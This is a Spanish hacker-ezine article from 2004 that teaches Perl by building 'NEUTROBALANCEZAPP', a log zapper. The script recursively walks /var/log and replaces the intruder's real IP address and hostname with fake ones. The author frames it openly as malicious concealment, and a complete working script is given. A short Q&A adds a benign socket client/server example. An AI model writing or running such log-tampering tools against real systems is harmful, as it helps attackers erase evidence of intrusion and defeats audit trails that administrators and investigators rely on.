[024]_Perl_a_dolor_2_edicion-Creando_nuestra_propia_utilleria_by_DDiego_DisidentS_Hack_Journal_-_5                         


                        -+-| DisidentS Hack Journal #5 |-+-







  ____________________________________________________________________________
 |                                                                            |
 |  -+- Titulo_____: PERL A DOLOR 2º EDICCION - CREANDO NUESTRA PROPIA        |
 |                   UTILLERIA [024.txt]                                      |  
 |  -+- Autor______: DDiego                                                   |
 |  -+- E-Mail_____: <ddiegodisidents@yahoo.es> - <diegorba@yahoo.es>         | 
 |  -+- Team_______: DISIDENTS ESPAÑA 2004 -  LOS FUERA DE LA LEY             | 
 |  -+- KB_________: 18.5KB  /**/neutrobalance.zip 9.3KB                      |   
 |  -+- Tema_______: Artesania en perl                                        |          
|_____________________________________________________________________________|





.==========================================================================.
|===========~ INDICE ~======================================================
|===========================================================================
|=~ 1.0  INTRODUCCION                                                    |
|=~ 2.0  CREANDO UN ZAPPER MUY ESPECIAL "NEUTROBALANCEZAPP v.1.0"        |
|=~ 3.0  NOTAS FINALES                                                   |
|=~ 4.0  SALUDOS                                           
|=~ 5.0  CONTACTO 
||=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
.======================================================~ INDICE ~===========
============================================================================




.==========================================================================.
|=====~ 1.0 INTRODUCCION ~==================================================
|===========================================================================

   Hola  amigos perleros,  siento no poder  hacer la 2º  parte del  tremendo 
manual de Perl a dolor de seguido, asi que la hare por  trozos, tipo añadidos
, vereis como creamos  muchos programas de utilidad, algunos de estos progra-
mas ya  tienes su tiempo,  de hecho este articulo  ya tiene un tiempo data de 
cuando hice el programa,  este es muy  simple y bastante  insteresante,  hare 
mas programas  y explicare como  los he  hecho, el  manual Perl a dolor sigue
pero en otro sentido  sera en articulos mas cortos por  ahora,  ma s que nada
por tiempo, me he metido a fondo en esta ocasion con la  "GUIA PROFESIONAL DE 
CONFIGURACION DE SERVIDORES"  podeis verla  en la ezine 5 tambien ;), pero no 
dejare el perl de lado,  llevo mucho tiempo sin escribir code en perl por ra-
zones profesionales,  pero pienso retomarlo y la primera manera de hacerlo es 
empezar de nuevo con esto,  como ya he dicho relatare  el como se hizo de mu-
chas utilidades, de ahi sacareis vosotros nuevas utilidades e ideas,  esto lo 
digo porque ya conozco a muchos de vosotros que habeis empezado con mi manual, 
me ha fascinado ver vuestras creacciones, bueno esto sera la continucacion de 
Perl a dolor,se que no es mucho pero lo sacare por capitulos como pueda, ten-
go  muchas cosas en mente ;) de utilidad para  vosotros  amigos mios,  seguir 
nuestra ezine atentamente ya vereis ;).


.==========================================================================.
|======~ 2.0 CREANDO UN ZAPPER MUY ESPECIAL "NEUTROBALANCEZAPP v.1.0" ~=====
|===========================================================================


      Caminando por  este maravilloso  mundo de perl,  un dia  se me ocurrio
crear  un zapper,  pero no un zapper normal, mi mente maliciosa buscaba algo
mas que borrar los logs, y pense estaria bien buscar tu ip y host y cambiar-
las por otras,  e incluso los de la propia maquina xDDD, apra ellos tendreis
que revisar la parte del manual "Perl a dolor" de la tercera ezine, el apar-
tado "2.0.0 JUGANDO CON EL TEXTO"

Veamos, imagenemos que tenemos un archivo llamado archivo.txt cuyo contenido
es el siguiente:

 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhh192.168.4.12hhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh


Dios mio si es nuestra ip, eso habria que cambiarlo,  y para ello creamos el
siguiente programa:

  #!/usr/bin/perl
  open (documento, "archivo.txt")
  or die "no se ha podido encontrar el archivo\n";#abrimos el archivo en modo
                                                  #lectura
  open (salida, "+<archivo.txt");#ahora lo abrimos en modo lectura y escritura
                                 #pero sin truncarlo
  foreach $lineas (<documento>){
  $lineas =~ s/192.168.4.12/192.168.0.1/g;#cambiamos la ip 192.168.4.12 por la
                                          #192.168.0.1
  print salida "$lineas";
  }
  close (documento);

jajaja cuando ejecutamos esto

 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhh192.168.0.1hhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
 hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh

ohhhhhhhhhhhh que bonito jajaja, va hay que recordar que posiblemente no sea
solo la ip lo que hay que cambiar,  tb habria queee bucar algun host por ahi
XDD, pura diversion y malicia };)


Umm ahora no interesaba saber como recorrer todo el arbol de directorios pa-
ra poder buscar en todos los archivos

 Ejemplo:

  #!/usr/bin/perl
  use File::Find;
  find (\&wanted, '/var/log'); #cuando encuetre /var/log iniciara la subrutina
  sub wanted
  {
  print "$File::Find::name\n"; #imprmiraa todo su  archivos interesante ;)
  }


 Salida:

  [root@localhost zapper]# perl filefind.pl
  /var/log
  /var/log/httpd
  /var/log/uucp
  /var/log/linuxconf
  /var/log/daemons
  /var/log/news
  /var/log/lpr
  /var/log/kernel

  ....

  /var/log/mail/warnings.2.gz
  /var/log/mail/info.3.gz
  /var/log/mail/warnings.3.gz
  /var/log/mail/warnings.1.gz
  /var/log/security


 :) good

 Umm ya esta todo preparado ahora lo meteremos en un array  y haremos el mo-
 tor del programa

  use File::Find;
  find (\&wanted, '/home/DDiego/programacion/perl/zapper/archivos');#Probe el programa en este directorio
  sub wanted
  {
  @archivos="$File::Find::name"; #lo metemos todo en un arreglo
  foreach $archivos (@archivos) {
                                  print "$archivos\n";  #imprime los archivos
                                  open (documento, "$archivos") or die "no se ha podido encontrar el archivo\n";#abrimos el archivo en modo lectura y escritura pero borrando el archivo para que no lo aada
                                  open (salida, "+<$archivos");
                                  foreach $lineas (<documento>){
                                  $lineas =~ s/192.168.4.12/192.168.0.1/g;
                                  print salida "$lineas";
  }
  close (documento);





                                 }
  }


 Ahora si lo has probado en un directorio cualquiera con varios archivos ve-
ras que ha sustituido la ip correctamente xDDD


 Bueno ahora veremos como quedaria el programa acabado:


<++> nzapp.pl

#!/usr/bin/perl
################################################################
# PROGRAMA = NEUTROBALANCEZAPP v.1.0                           #
# AUTOR = DDiego                                               #
# MAIL:Diegorba@yahoo.es                                       #
# URL: http://www.disidents.int-ltd.com - ver ASCII ;)         #
# MAILTEAM= disidents@yahoo.es                                 #
# Example; nzapp.pl 192.168.4.12 PC-412 192.168.0.1 SERVER1    #
################################################################

use File::Find;
die "sintaxis: $0  [ip a buscar] [host a buscar] [ip falsa] [host falso]
Escriba $0 --help para mas ayuda" unless ($ARGV[0]);
if ($ARGV[0] eq "--help") {
                           &ayuda;
                          }
else {
  print " .========================================================================.\n";
  print " ===============~ NEUTROBALANCEZAPP v.1.0 by DDiego ~======================\n";
  print " ==========================================================================\n\n";
$tuip=$ARGV[0];
$tuhost=$ARGV[1];
$ipfalsa=$ARGV[2];
$hostfalso=$ARGV[3];
print "Searching\n";
      find (\&wanted, '/var/log');
      sub wanted
                {
                 @archivos="$File::Find::name";
                 foreach $archivos (@archivos) {
                                                print "$archivos\n";
                                                open (documento, "$archivos") or die "no se ha podido encontrar el archivo\n";#abrimos el archivo en modo lectura y escritura pero borrando el archivo para que no lo aada
                                                open (salida, "+<$archivos");
                                                foreach $lineas (<documento>){
                                                $lineas =~ s/$tuip/$ipfalsa/g;
                                                $lineas =~ s/$tuhost/$hostfalso/g;
                                                print salida "$lineas";
                                               }
                                               close (documento);
                }
       }


sub ayuda {

print <<'ayudita';

.==========================================================================.
=                     Ayuda  NEUTROBALANCEZAPP                             =
============================================================================
=  [ip a buscar]   -> Tu ip real, que quireres falsear                     =
=  [host a buscar] -> Tu host real, que quireres falsear                   =
=  [ip falsa]      -> La ip falsa que quieres que reemplace a la tuya      =
=  [host falsa]    -> El host falso que quieres que reemplace a la tuya    =
============================================================================

ni neutrobalance ni pollas dos hostias bien das
ayudita
           }



}

print "\n";
print "                           ----------------------------------------------\n";
print "                           - Disidents Hacker Team - 2002               -\n";
print "                           - Webpage:  http://www.disidents.int-ltd.com -\n";
print "                           - Autor:    DDiego                           -\n";
print "                           - Mail:     DDiegorba\@yahoo.es              -\n";
print "                           - Mailteam: Disidents\@yahoo.es              -\n";
print "                           ----------------------------------------------\n";



<-->


- Espero que os sea de utilidad, para mi lo es, ademas os puede  ayudar para
  realizar otro tipo de busquedas etc ;)






.==========================================================================.
|=======~ 3.0.0 PREGUNTAS Y RESPUESTAS, PERL A DOLOR ~======================
|===========================================================================


- Hola lei tu articulo de perl a dolor y me parecio fantastico.

Bueno, pero el motivo de mi mail es otro, quisiera que me ayudaras necesito 
recibir inforcion de un puerto, pero necesito mandar antes una cadena que 
es la que solicita la informacion y automaticamente despues de eso el puer-
to me manda otra cadena de respuesta, el problema es que no puedo recibir 
nada, se queda trabado , que puedo hacer????



atte.  Barbara.


pd. Gracias de antemano por tu ayuda.

DDiego> Respuesta:
 
Hola, bueno estoy encantado de que te haya gustado, haber este es un
pequeo ejemplo de comunicacion cliente servidor usando el modulo IO::Socket


<server.pl>

 use IO::Socket;
 $sock = new IO::Socket::INET (LocalHost => 'localhost',
                               LocalPort => 1100,
                               Proto     => 'tcp',
                               Listen    =>  6,
                               Reuse     => 1
                               );
   die "No se ha podido crear el socket: $!\n" unless $sock;
   $conexion= $sock -> accept(); #Ahora aceptamos las conexiones
   $conexion->send("Cual es tu nombre: "); #Otro mensaje que enviaremos
   usando send
   recv($conexion, $nombre, 10,undef); #recibimos el nombre, y lo metemos
                                                        #en $nombre
                                                       #no esperamos mas de
                                                      #10 caracteres
   print $conexion "Hola $nombre\n"; #enviamos con print
   close ($conexion); #bye bye


Ahora el cliente:

<client.pl>

 #!/usr/bin/perl
   use IO::Socket;
   $sock = new IO::Socket::INET (PeerAddr => 'localhost',
                                 PeerPort => 1100,
                                 Proto    => 'tcp');

recv($sock, $pregunta, 30,undef);
print "$pregunta";
$respuesta=<STDIN>;
print $sock "$respuesta";
recv($sock, $saludo, 30,undef);
print "$saludo\n";
close $sock;
exit;

- Ya estoy con la segunda parte, y voy a profundizar mas en esto, y comentare
como funciona mas a fondo el modulo Socket, me interesaba saber  que tipo de
aplicacion estas haciendo quizas te pueda ayudar, = existe algun modulo que
te haga todo mas facil, venga  si tienes alguna duda  mas intentare
resolvertela.

Un saludo

 DDiego

 
 

.==========================================================================.
|=======~ 3.0 NOTAS FINALES ================================================
|=========================================================================== 
 
	Bueno espero que os haya gustado el programa, es bastante interesan-
te, tampoco es nada del otro mundo pero bueno. Pero ya vereis conforme vaya-
mos avanzando haremos programas mas interesantes,  e incluso  algun  exploit 
caera ;).  Esta no era la 2ª parte que esperaba pero bueno,  esperaba  hacer 
algo mas amplio tipo a  la 1ª parte de la guia,  pero no tengo otra forma de 
hacerlo por tiempo, si no lo saco por trozos no lo saco nunca, y tengo mucho
code guardado en el armario amigos,  y mas en mi mente por hacer ;), el pro-
ximo articulo sobre perl espero sacarlo para la 7ª ezine como mucho, o igual 
os doy una sorpresa en la 6, no se todo depende del tiempo que tenga.



.==========================================================================.
|=======~ 4.0 SALUDOS ====================================================== 
|===========================================================================
 
- SALUDOS:
 S-P-A-R-K, Taseh,  W3ndig0, N0rth, Rah3, X4B1, leon01, rootzero, Vanmore, 
 remains, damicita, wendell, karnak, {FEAR} , ADAROTH, charchi, ^[LoW]^, 
 Genl0g, bockvan, Shadows_T, hda, sunevil, T0wanda, AsHiRa-, NaNo-mAn, 
 ourkito, {^JaB3^}, Sisq0, Estxellon, Gibdeon, ^Garlick^, _0rAk00L_, Nakao, 
 MiHCS, _Azec]{_, d0b3rman, C0ven, ^jan, bad^boy, C_S, mi-6, {V|S|oN},  
 Vuur-Burn, X-CRoMe, wylli, Randomlog, CRowen, [BacK], Crypto, SirCandy, 
 ScRool, Meleth, hdi4, ZiltrOcs, ]DYD[, pinorrana, Quade2K, b-04, VeNt0r, 
 charchi, XhAp|nCo, Crash_18, [NeTrOh], elreviron, kl0nk, ZeRo-DivI, AlI10s, 
 mindlock, Lecter, mitr3in, XanKaiSen, madbiker, maniac, ASzY, dudu, la69, 
 Gn0m3, Overburn, Nusky, ST38410A, v01cAn0, |RDR|, FREEBRAIN, checksum, 
 full-up, ArTicMeN, JeNdArk, tvdd, dat, Fermat, [Shearer], Pangea-X, MiHCS, 
 Tresde, crypt0, slaughter_, xxSaintxx, CHARMING, Axtras y a todos los que 
 se pasan por el canal #disidents, sobre todo a Elia que me animo a volver 
 a escribir.
 
  
 

.==========================================================================.
|=======~ 5.0 CONTACTO ===================================================== 
|===========================================================================



.====[ Contacta conmigo o con el team ]====================================.
|                                                                          |
| ===[ MI MAIL ]====================== ===================[ MAIL TEAM ]=== |
| =  DDiegodisidents@yahoo.es        = = Disidents@yahoo.es              = |
| =  Diegorba@yahoo.es               = =                                 = |
| ===================================== ================================== |
| =====[ w3BpaG3s ]==================== =================[ Irc Servers ]== |
| =  http://www.karnakmx.com                = = irc.telecable.es  6667   = |
| =  http://disidents-team.cjb.net/         = = irc.irc-phoenix.org 6667 = |
| =  http://www.ciberia.ya.com/disidentsweb = ============================ |                          
| ===================================== =========[ Channels ]============= |
| =  EL HACKER NOBLE - DISIDENTS        =[ #disidents #codex #newbies    = |
| =  DATE: 06-01-2004                   =[ #seguridad_redes              = |
| ======================================================================== |
|                                                                          |
`===================================[ Contacta conmigo o con el team ]====='

                                                =~ El chico de las dos D ~=
                                      _
                                    (   )
                                      ~
                                      ~
                                      ~
                                      ~
                                      ~
                                      ~
                               |=============|
                               |=============|
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    \ | /
                                     \|/
                                      '






 
